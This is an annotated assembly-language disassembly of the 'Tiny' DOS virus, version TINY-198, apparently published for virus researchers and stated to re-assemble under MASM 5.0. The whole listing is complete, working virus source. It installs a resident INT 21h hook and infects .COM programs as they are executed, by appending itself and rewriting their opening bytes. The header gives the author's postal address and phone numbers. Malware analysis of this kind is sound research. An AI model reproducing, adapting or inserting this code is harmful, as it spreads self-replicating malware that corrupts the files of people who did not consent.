	page	,132
	name	TINY198
	title	The 'Tiny' virus, version TINY-198
	.radix	16

; ษออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออป
; บ  Bulgaria, 1404 Sofia, kv. "Emil Markov", bl. 26, vh. "W", et. 5, ap. 51 บ
; บ  Telephone: Private: +359-2-586261, Office: +359-2-71401 ext. 255	     บ
; บ									     บ
; บ			 The 'Tiny' Virus, version TINY-198                  บ
; บ		    Disassembled by Vesselin Bontchev, July 1990	     บ
; บ									     บ
; บ		     Copyright (c) Vesselin Bontchev 1989, 1990 	     บ
; บ									     บ
; บ	 This listing is only to be made available to virus researchers      บ
; บ		   or software writers on a need-to-know basis. 	     บ
; ศออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออผ

; The disassembly has been tested by re-assembly using MASM 5.0.

code	segment
	assume	cs:code, ds:code

	org	100

seg_60	equ	600
v_len	equ	v_end-v_entry

start:
	jmp	v_entry 	; Jump to virus code
	db	'M'             ; Virus signature
	mov	ax,4C00 	; Program terminate
	int	21

v_entry:
	call	self		; Determine the start addres of the virus body
self:
	pop	si
	sub	si,3

	push	ax		; Save AX (to keep programs as DISKCOPY happy)

; Check whether the virus is already in memory and just run the program if so:

	mov	ah,0E9
	int	21

	mov	di,seg_60	; Point ES:DI at 0000:0600h (i.e, segment 60h)
	xor	cx,cx		; ES := 0
	mov	es,cx
	mov	cl,v_len	; CX := virus length
	rep	movsb		; Move the virus body there

; Transfer control to cont: by PUSHing its address
; on the stack and executing RETF:

	push	es
	mov	ax,cont-v_entry+seg_60
	push	ax
	retf

; The original first 4 bytes of the infected file:

first4	db	0EBh, 2, 90, 90

; Resume execution from here (but already in segment 60h):

cont:

; Install new INT 21h handler and move the old one at INT 32h:

	mov	di,21*4
	mov	cl,2
	mov	ax,int_21-v_entry+seg_60
	cld
lp:
	push	word ptr es:[di]	; Get old handler's address
	pop	word ptr es:[di+(32-21)*4]	; Move it at INT 32h
	stosw			; Install the new one
	mov	ax,cs
	loop	lp		; Loop until done

; Save the original first 4 bytes of the infected program on the stack:

	push	word ptr cs:[first4-v_entry+seg_60]
	push	word ptr cs:[first4+2-v_entry+seg_60]

run_pgm:
	mov	di,offset start ; Point DI at program's start
	pop	word ptr [di+2] ; Restore the first 4 bytes of the program
	pop	word ptr [di]
	pop	ax		; Restore the original value of AX
	push	ds
	push	ds		; ES := DS
	pop	es
	push	di		; Push 100h on the stack
	retf

mem_chk:

; Push the original first 4 bytes of the infected program on the stack:

	push	word ptr [si+first4-v_entry]
	push	word ptr [si+first4+2-v_entry]
	jmp	run_pgm 	; And run the original program

int_21: 			; New INT 21h handler
	cmp	ah,0E9		; Memory check?
	je	mem_chk 	; If infected, run the original program
	cmp	ax,4B00 	; EXEC function call?
	jne	end_21		; Exit if not

	push	ax		; Save registers used
	push	bx
	push	cx
	push	dx
	push	di
	push	ds
	push	es

	push	cs		; ES := CS
	pop	es

	mov	ax,3D02 	; Open the file for both reading and writting
	int	32
	jc	end_exec	; Exit on error
	mov	bx,ax		; Save the file handle in BX

	mov	ah,3F		; Read the first 4 bytes of the file
	mov	cx,4		; 4 bytes to read
	mov	dx,first4-v_entry+seg_60	; Put them in first4
	mov	di,dx		; Save first4 address in DI
	push	cs		; DS := CS
	pop	ds
	int	32		; Do it

; Check whether the file is already infected or is an .EXE file.
; The former contains the character `M' in its 3rd byte and
; the latter contains it either in the 0th or in the 1st byte.

	push	di		; Save DI
	mov	al,'M'          ; Look for `M'
	repne	scasb
	pop	di		; Restore DI
	je	close		; Exit if file not suitable for infection

	mov	ax,4202 	; Seek to the end of file
	xor	cx,cx
	xor	dx,dx
	int	32		; Do it

	push	ax		; Save file length

	mov	dh,6		; DX = 600h, i.e. point it at 0000:0600h
	mov	cl,v_len	; Length of virus body
	mov	ah,40		; Append virus to file
	int	32		; Do it

	mov	ax,4200 	; Seek to the file beginning
	xor	cx,cx
	xor	dx,dx
	int	32		; Do it

	mov	dx,di		; Point DX at first4
	mov	al,0E9		; Near JMP opcode
	stosb			; Form the first instruction of the file
	pop	ax		; Restore file length in AX
	sub	ax,3		; Subtract 3 (first instruction length)
	stosw			; Form the JMP's opperand
	mov	al,'M'          ; Add a `M' character to mark the file
	stosb			;  as infected

	mov	cl,4		; Overwrite the first 4 bytes of the file
	mov	ah,40
	int	32		; Do it

close:
	mov	ah,3E		; Close the file
	int	32

end_exec:
	pop	es		; Restore used registers
	pop	ds
	pop	di
	pop	dx
	pop	cx
	pop	bx
	pop	ax

; Exit through the original INT 21h handler:

end_21:
	jmp	dword ptr cs:[32*4]

v_end	equ	$		; End of virus body

code	ends
	end	start
